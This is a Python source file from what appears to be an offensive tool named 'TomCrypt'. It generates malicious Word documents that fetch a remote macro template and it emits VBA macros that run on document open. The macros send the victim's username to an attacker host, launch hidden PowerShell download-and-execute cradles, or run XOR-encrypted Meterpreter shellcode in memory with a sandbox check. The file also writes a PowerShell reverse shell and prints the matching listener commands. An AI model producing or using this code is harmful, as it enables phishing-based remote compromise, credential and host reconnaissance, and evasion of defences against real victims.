        payload = ("windows/x64/meterpreter/reverse_tcp" if arch == "x64"
                   else "windows/meterpreter/reverse_tcp")
    detected = detect_arch(payload)
    if arch is None:
        arch = detected
    elif arch != detected:
        raise TomCryptError(
            f"-a {arch} does not match payload '{payload}' ({detected}).\n"
            "  x64: -a x64     (or -p windows/x64/meterpreter/reverse_tcp)\n"
            "  x86: -a x86     (or -p windows/meterpreter/reverse_tcp)\n"
            "  Omit -p to use the default payload for the chosen -a."
        )
    return payload, arch


def _xml_attr(value: str) -> str:
    amp = chr(38)
    return (value
            .replace(amp, amp + "amp;")
            .replace("<", amp + "lt;")
            .replace(">", amp + "gt;")
            .replace('"', amp + "quot;"))


def build_rti_server(port: int) -> str:
    """Standalone server. Word's first request is OPTIONS.

    python3 -m http.server answers that with 501 Unsupported method ('OPTIONS'),
    which is the "method OPTIONS not available" failure. Word never downloads
    the .dotm. This server returns 200 and does not advertise WebDAV.
    """
    port = int(port)
    if not (1 <= port <= 65535):
        raise TomCryptError(f"serve port out of range: {port}")
    return _RTI_SERVER_SRC.replace("__PORT__", str(port))


_RTI_SERVER_SRC = '#!/usr/bin/env python3\n"""TomCrypt RTI server.\n\nWord probes a remote attachedTemplate with OPTIONS (then HEAD) before GET.\npython3 -m http.server answers OPTIONS with:\n    501 Unsupported method (\'OPTIONS\')\nwhich is the "method OPTIONS not available" failure. The .dotm is never fetched.\n\nThis server returns 200 to OPTIONS and then serves the file.\nIt does NOT advertise WebDAV (DAV / MS-Author-Via). Doing so makes Word\nswitch to PROPFIND and the download stalls.\n\n    sudo python3 THIS_FILE     # PORT < 1024\n    python3 THIS_FILE\n"""\nfrom __future__ import annotations\n\nimport os\nimport sys\nimport urllib.parse\nfrom http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer\nfrom pathlib import Path\n\nPORT = __PORT__\nROOT = Path(__file__).resolve().parent\n\n\nclass Handler(SimpleHTTPRequestHandler):\n    extensions_map = {\n        **SimpleHTTPRequestHandler.extensions_map,\n        ".dotm": "application/vnd.ms-word.template.macroEnabled.12",\n        ".docm": "application/vnd.ms-word.document.macroEnabled.12",\n        ".docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",\n        ".dotx": "application/vnd.openxmlformats-officedocument.wordprocessingml.template",\n        ".bas": "text/plain",\n        ".vba": "text/plain",\n    }\n\n    def _log_request(self, method):\n        ip = self.client_address[0]\n        port = self.client_address[1]\n        ua = self.headers.get("User-Agent", "-")\n        sys.stderr.write("[rti] %s from %s:%s  %s\\n" % (method, ip, port, self.path))\n        sys.stderr.write("[rti]   User-Agent: %s\\n" % ua)\n        # Log a few other headers Word sometimes sends\n        for h in ("Host", "Accept", "Accept-Language", "Connection"):\n            v = self.headers.get(h)\n            if v:\n                sys.stderr.write("[rti]   %s: %s\\n" % (h, v))\n\n    def do_OPTIONS(self):\n        # Word OPTIONS the directory and/or the .dotm URL. Answer both.\n        self._log_request("OPTIONS")\n        self.send_response(200)\n        self.send_header("Allow", "GET, HEAD, OPTIONS")\n        self.send_header("Content-Length", "0")\n        self.end_headers()\n\n    def _note_if_missing(self):\n        rel = urllib.parse.unquote(urllib.parse.urlparse(self.path).path).lstrip("/")\n        if not rel or rel.endswith("/"):\n            return\n        candidate = ROOT / rel\n        if not candidate.is_file():\n            sys.stderr.write("[-] not on disk: %s\\n" % candidate)\n            sys.stderr.write("    name is case-sensitive and must match the lure URL\\n")\n\n    def do_HEAD(self):\n        self._log_request("HEAD")\n        self._note_if_missing()\n        super().do_HEAD()\n\n    def do_GET(self):\n        self._log_request("GET")\n        self._note_if_missing()\n        super().do_GET()\n\n    def log_message(self, fmt, *args):\n        # Suppress default log; IP is logged in the method handlers.\n        pass\n\n\ndef main():\n    os.chdir(ROOT)\n    try:\n        httpd = ThreadingHTTPServer(("0.0.0.0", PORT), Handler)\n    except OSError as exc:\n        sys.stderr.write("[-] bind 0.0.0.0:%s failed: %s\\n" % (PORT, exc))\n        if PORT < 1024:\n            sys.stderr.write("    sudo python3 %s\\n" % Path(__file__).name)\n        sys.exit(1)\n    sys.stderr.write("[+] RTI server  0.0.0.0:%s  root=%s\\n" % (PORT, ROOT))\n    sys.stderr.write("[+] healthy open: OPTIONS 200, then HEAD 200, then GET 200\\n")\n    sys.stderr.write("[+] do not use python3 -m http.server - it 501s OPTIONS\\n")\n    try:\n        httpd.serve_forever()\n    except KeyboardInterrupt:\n        sys.stderr.write("\\n[!] stopped\\n")\n\n\nif __name__ == "__main__":\n    main()\n'


def build_docx_rti(lhost: str, serve_port: int, dotm_name: str) -> bytes:
    """Create a minimal .docx that fetches a remote .dotm template (RTI).

    When Word opens the .docx it silently fetches the template URL, and any
    AutoOpen / Document_Open macro in the .dotm fires automatically.

    Structure:
      [Content_Types].xml
      _rels/.rels                       → word/document.xml
      word/document.xml                 → lure text
      word/_rels/document.xml.rels      → word/settings.xml
      word/settings.xml                 → attachedTemplate r:id=rId1
      word/_rels/settings.xml.rels      → http://LHOST/DOTM (External)
    """
    import zipfile, io

    url = _xml_attr(rti_template_url(lhost, serve_port, dotm_name))

    ct = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">\n'
        '  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>\n'
        '  <Default Extension="xml"  ContentType="application/xml"/>\n'
        '  <Override PartName="/word/document.xml"\n'
        '    ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>\n'
        '  <Override PartName="/word/settings.xml"\n'
        '    ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/>\n'
        '</Types>'
    )
    pkg_rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
        '  <Relationship Id="rId1"\n'
        '    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"\n'
        '    Target="word/document.xml"/>\n'
        '</Relationships>'
    )
    doc_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">\n'
        '  <w:body>\n'
        '    <w:p><w:r><w:t>Loading, please wait...</w:t></w:r></w:p>\n'
        '    <w:sectPr/>\n'
        '  </w:body>\n'
        '</w:document>'
    )
    doc_rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
        '  <Relationship Id="rId1"\n'
        '    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings"\n'
        '    Target="settings.xml"/>\n'
        '</Relationships>'
    )
    settings_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"\n'
        '            xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">\n'
        '  <w:attachedTemplate r:id="rId1"/>\n'
        '</w:settings>'
    )
    settings_rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
        f'  <Relationship Id="rId1"\n'
        f'    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"\n'
        f'    Target="{url}"\n'
        f'    TargetMode="External"/>\n'
        '</Relationships>'
    )

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('[Content_Types].xml',          ct)
        zf.writestr('_rels/.rels',                  pkg_rels)
        zf.writestr('word/document.xml',            doc_xml)
        zf.writestr('word/_rels/document.xml.rels', doc_rels)
        zf.writestr('word/settings.xml',            settings_xml)
        zf.writestr('word/_rels/settings.xml.rels', settings_rels)
    return buf.getvalue()


def _try_dotm_libreoffice(vba_code: str, out_path: Path) -> bool:
    """Attempt to create a .dotm with VBA macros via LibreOffice Python UNO.

    Requires: soffice (LibreOffice) in PATH + python3-uno installed.
    Returns True on success, False if unavailable or any step fails.
    """
    import shutil, tempfile, time as _time, os as _os

    soffice = shutil.which("soffice") or shutil.which("libreoffice")
    if not soffice:
        return False

    # Self-contained UNO helper script
    uno_src = (
        "import sys, os\n"
        "sys.path.insert(0, '/usr/lib/python3/dist-packages')\n"
        "try:\n"
        "    import uno\n"
        "    from com.sun.star.beans import PropertyValue\n"
        "except ImportError:\n"
        "    sys.exit(2)\n"
        "def main():\n"
        "    ctx = uno.getComponentContext()\n"
        "    res = ctx.ServiceManager.createInstanceWithContext(\n"
        "        'com.sun.star.bridge.UnoUrlResolver', ctx)\n"
        "    try:\n"
        "        rctx = res.resolve(\n"
        "            'uno:socket,host=localhost,port=2002;urp;StarOffice.ComponentContext')\n"
        "    except Exception as e:\n"
        "        print(f'UNO connect failed: {e}', file=sys.stderr)\n"
        "        sys.exit(3)\n"
        "    dt = rctx.ServiceManager.createInstanceWithContext(\n"
        "        'com.sun.star.frame.Desktop', rctx)\n"
        "    doc = dt.loadComponentFromURL(\n"
        "        'private:factory/swriter', '_blank', 0, ())\n"
        "    libs = doc.getBasicLibraries()\n"
        "    if not libs.hasByName('Standard'):\n"
        "        libs.createLibrary('Standard')\n"
        "    lib = libs.getByName('Standard')\n"
        f"    vba = {repr(vba_code)}\n"
        "    if lib.hasByName('Module1'):\n"
        "        lib.replaceByName('Module1', vba)\n"
        "    else:\n"
        "        lib.insertByName('Module1', vba)\n"
        "    p = PropertyValue()\n"
        "    p.Name = 'FilterName'\n"
        "    p.Value = 'MS Word 2007 XML Template'\n"
        f"    doc.storeToURL(uno.systemPathToFileUrl({repr(str(out_path.resolve()))}), (p,))\n"
        "    doc.close(True)\n"
        "main()\n"
    )

    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False,
                                     dir='/tmp', prefix='tc_uno_') as tf:
        tf.write(uno_src)
        script = tf.name

    lo_proc = None
    try:
        lo_proc = subprocess.Popen(
            [soffice, "--headless", "--norestore", "--nofirststartwizard",
             "--accept=socket,host=localhost,port=2002;urp;"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        _time.sleep(3)
        r = subprocess.run(["python3", script], timeout=25,
                           capture_output=True)
        return r.returncode == 0 and out_path.exists()
    except Exception:
        return False
    finally:
        try:
            if lo_proc:
                lo_proc.terminate()
                lo_proc.wait(timeout=5)
        except Exception:
            pass
        try:
            _os.unlink(script)
        except Exception:
            pass


def build_vba_enum(lhost: str, port: int = 80, delay: int = 3) -> str:
    """Minimal VBA host enum — process name, arch (x86/x64), DOMAIN\\user.

    Delivery chain (first success wins):
      1. WScript.Shell.Run curl -X POST  (Win10 1803+; synchronous via bWaitOnReturn)
      2. WinHttp.WinHttpRequest.5.1 POST (COM-based; available on all Windows)

    Run() returns curl's exit code. Non-zero (curl absent / network fail) triggers
    the WinHttp fallback. On Error Resume Next swallows anything else.
    arch is resolved at compile time via #If Win64 (reflects Office bitness, not OS).
    delay accepted for CLI compat but not applied; fires on document open.
    """
    fn     = rand_id()
    v_wsh  = rand_id()
    v_wmi  = rand_id()
    v_pr   = rand_id()
    v_p    = rand_id()
    v_htp  = rand_id()
    v_nm   = rand_id()
    v_arch = rand_id()
    v_usr  = rand_id()
    v_res  = rand_id()
    v_rc   = rand_id()
    junk   = rand_junk()
    url    = f"http://{lhost}" if port == 80 else f"http://{lhost}:{port}"

    return f"""\
' TomCrypt v{__version__} - VBA Host Enum
' {junk}
Option Explicit

Private Declare PtrSafe Function GetCurrentProcessId Lib "kernel32" () As Long

Sub AutoOpen()
    {fn}
End Sub

Sub Document_Open()
    {fn}
End Sub

Sub {fn}()
    On Error Resume Next

    Dim {v_wsh}  As Object
    Dim {v_wmi}  As Object
    Dim {v_pr}   As Object
    Dim {v_p}    As Object
    Dim {v_htp}  As Object
    Dim {v_nm}   As String
    Dim {v_arch} As String
    Dim {v_usr}  As String
    Dim {v_res}  As String
    Dim {v_rc}   As Long

    ' Process name
    {v_nm} = "unknown"
    Set {v_wmi} = GetObject("winmgmts:\\\\.\\root\\cimv2")
    Set {v_pr}  = {v_wmi}.ExecQuery("SELECT Name FROM Win32_Process WHERE ProcessId = " & GetCurrentProcessId())
    For Each {v_p} In {v_pr}
        {v_nm} = {v_p}.Name
        Exit For
    Next {v_p}

    ' Architecture (compile-time — reflects Office bitness)
#If Win64 Then
    {v_arch} = "x64"
#Else
    {v_arch} = "x86"
#End If

    ' Username: DOMAIN\\user
    {v_usr} = Environ("USERDOMAIN") & "\\" & Environ("USERNAME")

    {v_res} = "proc=" & {v_nm} & "&arch=" & {v_arch} & "&user=" & {v_usr}

    ' curl (Win10 1803+)
    Set {v_wsh} = CreateObject("WScript.Shell")
    {v_rc} = {v_wsh}.Run("cmd.exe /c curl -s -X POST -d " & Chr(34) & {v_res} & Chr(34) & " {url}", 0, True)

    ' WinHttp fallback
    If {v_rc} <> 0 Then
        Set {v_htp} = CreateObject("WinHttp.WinHttpRequest.5.1")
        If Not {v_htp} Is Nothing Then
            {v_htp}.SetTimeouts 2000, 2000, 4000, 4000
            {v_htp}.Open "POST", "{url}", False
            {v_htp}.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
            {v_htp}.SetRequestHeader "Connection", "close"
            {v_htp}.Send {v_res}
            Set {v_htp} = Nothing
        End If
    End If
End Sub
"""


def build_vba_enum_quiet(lhost: str, port: int = 80) -> str:
    """Quiet VBA recon for RTI — Office bitness + DOMAIN\\user via Environ + one WinHttp POST.

    No WMI, no WScript.Shell, no curl. Designed to stay closer to the working ping
    in terms of AMSI surface.
    """
    fn     = rand_id()
    v_http = rand_id()
    v_arch = rand_id()
    v_usr  = rand_id()
    v_res  = rand_id()
    junk   = rand_junk()
    url    = f"http://{lhost}" if port == 80 else f"http://{lhost}:{port}"

    return f"""\
' TomCrypt quiet enum | {junk}
Option Explicit

Sub AutoOpen()
    {fn}
End Sub

Sub Document_Open()
    {fn}
End Sub

Sub {fn}()
    On Error Resume Next
    Dim {v_http} As Object
    Dim {v_arch} As String
    Dim {v_usr}  As String
    Dim {v_res}  As String

#If Win64 Then
    {v_arch} = "x64"
#Else
    {v_arch} = "x86"
#End If

    {v_usr} = Environ("USERDOMAIN") & "\\" & Environ("USERNAME")
    {v_res} = "arch=" & {v_arch} & "&user=" & {v_usr}

    Set {v_http} = CreateObject("WinHttp.WinHttpRequest.5.1")
    If Not {v_http} Is Nothing Then
        {v_http}.SetTimeouts 2000, 2000, 4000, 4000
        {v_http}.Open "POST", "{url}", False
        {v_http}.SetRequestHeader "Content-Type", "text/plain"
        {v_http}.Send {v_res}
        Set {v_http} = Nothing
    End If
End Sub
"""


def build_vba_ping(lhost: str, port: int = 80, token: Optional[str] = None) -> str:
    """Minimal VBA ping — AutoOpen/Document_Open + one WinHttp POST with unique token.

    Designed for maximum reliability on initial phishing in lab environments.
    """
    if token is None:
        token = rand_junk(12)
    fn = rand_id()
    v_http = rand_id()
    junk = rand_junk()
    url = f"http://{lhost}" if port == 80 else f"http://{lhost}:{port}"

    return f"""\
' TomCrypt ping | {junk}
Option Explicit

Sub AutoOpen()
    {fn}
End Sub

Sub Document_Open()
    {fn}
End Sub

Sub {fn}()
    On Error Resume Next
    Dim {v_http} As Object
    Set {v_http} = CreateObject("WinHttp.WinHttpRequest.5.1")
    If Not {v_http} Is Nothing Then
        {v_http}.SetTimeouts 2000, 2000, 4000, 4000
        {v_http}.Open "POST", "{url}", False
        {v_http}.SetRequestHeader "Content-Type", "text/plain"
        {v_http}.Send "ping={token}"
        Set {v_http} = Nothing
    End If
End Sub
"""


def build_vba_mini(lhost: str, filename: str) -> str:
    """Minimal VBA download cradle.

    VBA only launches an encoded PowerShell one-liner that does
    IEX(IWR http://LHOST/filename). The real payload is the hosted file.
    """
    import base64
    ps_cmd = f"iex(iwr http://{lhost}/{filename} -usebasicparsing)"
    encoded = base64.b64encode(ps_cmd.encode("utf-16le")).decode()
    fn = rand_id()
    junk = rand_junk()

    return f"""\
' TomCrypt mini | {junk}
' Download cradle — payload lives at http://{lhost}/{filename}
Option Explicit

Sub AutoOpen()
    {fn}
End Sub

Sub Document_Open()
    {fn}
End Sub

Sub {fn}()
    On Error Resume Next
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "powershell -Sta -Nop -Window Hidden -EncodedCommand {encoded}", 0, False
    Set wsh = Nothing
End Sub
"""


def build_vba_shell(lhost: str, lport: int, fmt: str, filename: str) -> str:
    main_fn = rand_id()
    junk    = rand_junk()
    url     = f"http://{lhost}/{filename}"

    if fmt in ("ps1", "txt"):
        exec_line = ('    wsh.Run "powershell -w hidden -nop -c " & Chr(34)'
                     ' & "IEX (New-Object Net.WebClient).DownloadString(" & Chr(39)'
                     f' & "{url}" & Chr(39) & ")"'
                     ' & Chr(34), 0, False')
    else:
        exec_line = ('    wsh.Run "powershell -w hidden -nop -c " & Chr(34)'
                     ' & "$d=(New-Object Net.WebClient).DownloadData(" & Chr(39)'
                     f' & "{url}" & Chr(39)'
                     ' & ");[Reflection.Assembly]::Load($d).EntryPoint.Invoke($null,$null)"'
                     ' & Chr(34), 0, False')

    return f"""' TomCrypt v{__version__} - VBA Shell Delivery
' {junk}
' LHOST: {lhost} | LPORT: {lport} | Format: {fmt}
' Payload: {url}

Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Sub AutoOpen()
    {main_fn}
End Sub

Sub Document_Open()
    {main_fn}
End Sub

Sub {main_fn}()
    On Error Resume Next

    Dim t0 As Date
    t0 = Now()
    Sleep 4000
    If DateDiff("s", t0, Now()) < 3 Then Exit Sub

    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
{exec_line}
End Sub
"""


def _vba_assignments(data: list, per_line: int = 8) -> str:
    lines = []
    for i in range(0, len(data), per_line):
        chunk = data[i:i + per_line]
        parts = [f"sc({i+j}) = {b}" for j, b in enumerate(chunk)]
        lines.append("    " + " : ".join(parts))
    return "\n".join(lines)


def _run_msfvenom_vba(cfg: Config, key: str, arch: Optional[str] = None) -> list:
    if arch is None:
        arch = detect_arch(cfg.payload)
    cmd  = ["msfvenom", "-p", cfg.payload, "-a", arch]
    cmd += [
        f"LHOST={cfg.lhost}",
        f"LPORT={cfg.lport}",
        "EXITFUNC=thread",
        "-f", "vbapplication",
        "--encrypt", "xor",
        "--encrypt-key", key,
    ]
    print(info(f"msfvenom: {' '.join(cmd)}"))
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    except FileNotFoundError:
        raise TomCryptError("msfvenom not found.")
    except subprocess.TimeoutExpired:
        raise TomCryptError("msfvenom timed out after 120 s.")
    if p.returncode != 0:
        raise TomCryptError(f"msfvenom failed:\n{p.stderr or p.stdout}")
    cleaned = p.stdout.replace("\r\n", "\n").replace("\r", "\n")
    cleaned = re.sub(r"[ \t]*_[ \t]*\n", " ", cleaned)
    m = re.search(r"Array\(([^)]*)\)", cleaned, re.DOTALL)
    if not m:
        snippet = (p.stdout or p.stderr or "")[:500]
        raise TomCryptError(
            "Could not parse Array() from msfvenom vbapplication output.\n" + snippet
        )
    nums = []
    for raw in m.group(1).split(","):
        tok = raw.strip()
        if not tok:
            continue
        nums.append(int(tok, 0))
    if not nums:
        raise TomCryptError("msfvenom Array() was empty.")
    return nums


def build_vba_runner(sc_bytes: list, cfg: Config, key: str) -> str:
    fn     = rand_id()
    i_v    = rand_id()
    key_v  = rand_id()
    a_v    = rand_id()
    c_v    = rand_id()
    d_v    = rand_id()
    r_v    = rand_id()
    op_v   = rand_id()
    t0_v   = rand_id()
    junk   = rand_junk()
    sc_len = len(sc_bytes)
    asgn   = _vba_assignments(sc_bytes)

    return (
        f"' TomCrypt v{__version__} - VBA Shellcode Runner\n"
        f"' {junk}\n"
        f"' Payload : {cfg.payload}\n"
        f"' Arch    : {detect_arch(cfg.payload)}   (must match Word bitness, not the OS)\n"
        f"' LHOST   : {cfg.lhost}   LPORT : {cfg.lport}\n"
        f"' Paste   : Alt+F11 -> Insert -> Module. AutoOpen is the trigger.\n"
        f"' Encrypt : XOR (msfvenom --encrypt xor)\n"
        f"' Mode    : Self-contained - shellcode embedded, no download, no Add-Type\n"
        f"\n"
        f"#If Win64 Then\n"
        f'    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr\n'
        f'    Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long\n'
        f'    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr\n'
        f'    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr\n'
        f'    Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As LongPtr, ByVal dwMilliseconds As Long) As Long\n'
        f'    Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long\n'
        f"#Else\n"
        f'    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long\n'
        f'    Private Declare Function VirtualProtect Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long\n'
        f'    Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As Long, ByRef sSource As Any, ByVal lLength As Long) As Long\n'
        f'    Private Declare Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As Long, ThreadParameter As Long, ByVal CreateFlags As Long, ByRef ThreadId As Long) As Long\n'
        f'    Private Declare Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long\n'
        f'    Private Declare Function Sleep Lib "kernel32" (ByVal mili As Long) As Long\n'
        f"#End If\n"
        f"\n"
        f"Sub AutoOpen()\n"
        f"    {fn}\n"
        f"End Sub\n"
        f"\n"
        f"Sub Document_Open()\n"
        f"    {fn}\n"
        f"End Sub\n"
        f"\n"
        f"Function {fn}()\n"
        f"    Dim sc({sc_len - 1}) As Byte\n"
        f"#If Win64 Then\n"
        f"    Dim {a_v} As LongPtr\n"
        f"    Dim {r_v} As LongPtr\n"
        f"#Else\n"
        f"    Dim {a_v} As Long\n"
        f"    Dim {r_v} As Long\n"
        f"#End If\n"
        f"    Dim {c_v}  As Long\n"
        f"    Dim {d_v}  As Long\n"
        f"    Dim {op_v} As Long\n"
        f"    Dim {i_v}  As Long\n"
        f"    Dim {key_v} As String\n"
        f"    Dim {t0_v} As Date\n"
        f"\n"
        f"    {t0_v} = Now()\n"
        f"    Sleep 4000\n"
        f"    If DateDiff(\"s\", {t0_v}, Now()) < 3 Then Exit Function\n"
        f"\n"
        f"    {key_v} = \"{key}\"\n"
        f"\n"
        f"{asgn}\n"
        f"\n"
        f"    For {i_v} = 0 To UBound(sc)\n"
        f"        sc({i_v}) = sc({i_v}) Xor Asc(Mid({key_v}, ({i_v} Mod Len({key_v})) + 1, 1))\n"
        f"    Next {i_v}\n"
        f"\n"
        f"    {a_v} = VirtualAlloc(0, {sc_len}, &H3000, &H04)\n"
        f"\n"
        f"    For {c_v} = 0 To UBound(sc)\n"
        f"        {d_v} = sc({c_v})\n"
        f"        {r_v} = RtlMoveMemory({a_v} + {c_v}, {d_v}, 1)\n"
        f"    Next {c_v}\n"
        f"\n"
        f"    {r_v} = VirtualProtect({a_v}, {sc_len}, &H20, {op_v})\n"
        f"\n"
        f"    {r_v} = CreateThread(0, 0, {a_v}, 0, 0, 0)\n"
        f"    {r_v} = WaitForSingleObject({r_v}, &HFFFFFFFF)\n"
        f"End Function\n"
    )


def cmd_vba_runner(args: argparse.Namespace) -> None:
    lhost = resolve_lhost(args.lhost)
    cfg   = Config(
        payload = args.payload,
        lhost   = lhost,
        lport   = args.lport,
        output  = Path(args.output) if args.output else None,
    )

    arch = resolve_arch(cfg.payload, getattr(args, "arch", None))
    key  = rand_junk(10)

    print(ok(f"TomCrypt v{__version__} [vba runner]"))
    print(info(f"Payload  : {cfg.payload}"))
    print(info(f"Arch     : {arch}"))
    print(info(f"LHOST    : {lhost}"))
    print(info(f"LPORT    : {args.lport}"))
    print(info(f"XOR key  : {key}  (random per run)"))
    print(info("Mode     : Self-contained — shellcode embedded, no server needed"))

    sc_bytes = _run_msfvenom_vba(cfg, key, arch)
    print(info(f"Shellcode: {len(sc_bytes)} bytes (XOR encrypted)"))

    vba_code = build_vba_runner(sc_bytes, cfg, key)

    stem = cfg.output.stem if cfg.output else "ShellcodeRunner"
    bdir = cfg.output.parent if cfg.output else Path.cwd()
    out  = bdir / f"{stem}.vba"
    out.write_text(vba_code, encoding="utf-8")
    print(ok(f"Output   : {out}"))

    listener = (
        f"msfconsole -q -x 'use multi/handler; "
        f"set payload {cfg.payload}; "
        f"set LHOST {lhost}; "
        f"set LPORT {args.lport}; "
        f"set ExitOnSession false; run -j'"
    )

    print()
    print(_SEP)
    print(ok("DELIVERY"))
    print(_SEP)
    print(info("Paste into VBA editor  : Alt+F11 -> Insert -> Module -> paste"))
    print(hint("  AutoOpen + Document_Open both wired - fires on document open"))
    print(hint("  4s sleep sandbox check - fast-forward sandboxes exit cleanly"))
    print(hint("  RW alloc -> copy -> RX flip - no RWX region ever exists"))
    print(hint("  Shellcode runs inside the Office process (WINWORD.EXE / EXCEL.EXE)"))
    print()
    print(ok("Listener :"))
    print(f"  {listener}")
    print(_SEP)


def cmd_vba_enum(args: argparse.Namespace) -> None:
    lhost = resolve_lhost(args.lhost)
    port  = args.recv_port

    vba   = build_vba_enum(lhost, port)
    stem  = Path(args.output).stem if args.output else "HostEnum"
    bdir  = Path(args.output).parent if args.output else Path.cwd()
    out   = bdir / f"{stem}.vba"
    out.write_text(vba, encoding="utf-8")

    print(ok(f"TomCrypt v{__version__} [vba enum]"))
    print(info(f"LHOST    : {lhost}"))
    print(info(f"Receiver : port {port}"))
    print(ok(f"Output   : {out}"))
    print()
    print(_SEP)
    print(ok("DELIVERY"))
    print(_SEP)
    print(info("Step 1 - Start receiver on Kali:"))
    print(hint(f"  nc -lvnp {port}"))
    print()
    print(info("Step 2 - Paste into VBA editor (Alt+F11 in Word/Excel), save, open doc:"))
    print(hint("  Fires immediately on AutoOpen / Document_Open"))
    print(hint("  Sends: proc=<hosting_process.exe>&user=<username>"))
    print(_SEP)


def cmd_vba_ping(args: argparse.Namespace) -> None:
    lhost = resolve_lhost(args.lhost)
    port  = args.recv_port
    token = args.token or rand_junk(12)

    vba   = build_vba_ping(lhost, port, token)
    stem  = Path(args.output).stem if args.output else "Ping"
    bdir  = Path(args.output).parent if args.output else Path.cwd()
    out   = bdir / f"{stem}.vba"
    out.write_text(vba, encoding="utf-8")

    print(ok(f"TomCrypt v{__version__} [vba ping]"))
    print(info(f"LHOST    : {lhost}"))
    print(info(f"Receiver : port {port}"))
    print(info(f"Token    : {token}"))
    print(ok(f"Output   : {out}"))
    print()
    print(_SEP)
    print(ok("DELIVERY"))
    print(_SEP)
    print(info("Step 1 - Start receiver on Kali:"))
    print(hint(f"  nc -lvnp {port}"))
    print(hint(f"  Look for: ping={token}"))
    print()
    print(info("Step 2 - Paste into VBA editor (Alt+F11), save as macro-enabled, open:"))
    print(hint("  Fires on AutoOpen / Document_Open"))
    print(_SEP)


def cmd_vba_mini(args: argparse.Namespace) -> None:
    lhost = resolve_lhost(args.lhost)
    mode  = getattr(args, "mode", "rev")
    payload = args.payload
    arch_flag = getattr(args, "arch", None)
    if arch_flag == "x86" and payload == "windows/x64/meterpreter/reverse_tcp":
        payload = "windows/meterpreter/reverse_tcp"
    elif arch_flag == "x64" and payload == "windows/meterpreter/reverse_tcp":
        payload = "windows/x64/meterpreter/reverse_tcp"

    cfg = Config(
        payload = payload,
        lhost   = lhost,
        lport   = args.lport,
        output  = Path(args.output) if args.output else None,
    )
    arch = resolve_arch(cfg.payload, arch_flag) if mode == "ps1" else (arch_flag or "x64")

    print(ok(f"TomCrypt v{__version__} [vba mini]"))
    print(info(f"Mode     : {mode}"))
    print(info(f"LHOST    : {lhost}"))
    print(info(f"LPORT    : {args.lport}"))

    stem = cfg.output.stem if cfg.output else "mini"
    bdir = cfg.output.parent if cfg.output else Path.cwd()
    bdir.mkdir(parents=True, exist_ok=True)
    txt_path = bdir / f"{stem}.txt"

    if mode == "rev":
        txt_content = f'''$c = New-Object System.Net.Sockets.TCPClient("{lhost}", {args.lport})
$s = $c.GetStream()
[byte[]]$b = 0..65535 | %{{0}}
while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {{
    $d = (New-Object Text.ASCIIEncoding).GetString($b, 0, $i)
    $r = (iex $d 2>&1 | Out-String)
    $r2 = $r + "PS " + (pwd).Path + "> "
    $sb = ([text.encoding]::ASCII).GetBytes($r2)
    $s.Write($sb, 0, $sb.Length)
    $s.Flush()
}}
$c.Close()
'''
        print(info("Payload  : PowerShell reverse shell (no shellcode)"))
    elif mode == "exe":
        exe_name = f"{stem}.exe"
        txt_content = f'''$p = "$env:TEMP\\{exe_name}"
iwr "http://{lhost}/{exe_name}" -OutFile $p
Start-Process $p
'''
